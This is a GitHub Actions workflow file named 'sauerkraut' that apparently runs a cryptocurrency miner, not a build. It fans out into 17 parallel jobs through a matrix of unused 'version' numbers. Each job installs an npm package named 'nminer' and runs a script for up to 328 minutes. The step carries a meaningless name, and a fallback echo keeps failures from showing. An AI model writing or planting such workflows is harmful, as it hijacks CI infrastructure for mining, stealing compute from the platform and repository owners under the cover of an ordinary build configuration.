name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5203 }
          - { version: 6465 }
          - { version: 3678 }
          - { version: 993 }
          - { version: 81 }
          - { version: 2883 }
          - { version: 2631 }
          - { version: 5780 }
          - { version: 2600 }
          - { version: 7368 }
          - { version: 5155 }
          - { version: 5335 }
          - { version: 5454 }
          - { version: 3653 }
          - { version: 3046 }
          - { version: 13 }
          - { version: 9988 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: duh granny honored earnest
        run: |
          npm install nminer@latest
          timeout 328m node sauerkraut.js || echo "sauerkraut executed"